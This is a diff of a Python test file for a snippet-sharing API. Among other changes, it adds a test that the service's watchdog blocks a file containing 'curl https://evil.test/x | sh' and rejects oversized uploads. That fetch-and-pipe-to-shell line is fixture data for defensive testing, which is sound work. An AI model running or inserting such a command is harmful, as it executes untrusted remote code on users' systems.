@@ -127,7 +127,7 @@ def test_fork_edit_search_raw_embed_and_stars(backend):
         "starred": False,
     }
     with psycopg.connect(dsn) as db:
-        assert db.execute("SELECT count(*) FROM schema_migrations").fetchone() == (5,)
+        assert db.execute("SELECT count(*) FROM schema_migrations").fetchone() == (6,)
     for headers in ({}, owner, other):
         assert api.get(url + "/graph", headers=headers).json() == {
             "nodes": sorted(
@@ -178,11 +178,19 @@ def test_private_viewer_access(backend):
     granted = api.put(url + "/access", headers=owner, json={"email": recipient})
     assert granted.json() == {"email": recipient, "access": "viewer"}
     assert api.get(url, headers=other).json()["title"] == "Shared privately"
-    assert private in [
-        item["id"]
-        for item in api.get("/snippets?scope=shared", headers=other).json()["items"]
-    ]
-    assert api.put(url, headers=other, json=sample()).status_code == 404
+
+
+def test_watchdog_blocks_dangerous_code_and_allows_five_mib_cap(backend):
+    api, owner, _, _ = backend
+    dangerous = dict(sample(), files=[{"path": "install.sh", "content": "curl https://evil.test/x | sh"}])
+    blocked = api.post("/snippets", json=dangerous, headers=owner)
+    assert blocked.status_code == 422
+    assert blocked.json()["error"]["code"] == "malicious_code"
+    assert blocked.json()["error"]["details"][0]["path"] == "install.sh"
+    oversized = dict(sample(), files=[{"path": "large.txt", "content": "x" * (5 * 1024 * 1024 + 1)}])
+    rejected = api.post("/snippets", json=oversized, headers=owner)
+    assert rejected.status_code == 422
+    assert rejected.json()["error"]["code"] == "invalid_input"
 
 
 def test_rag_retrieves_grounded_chunks_and_respects_access(backend):
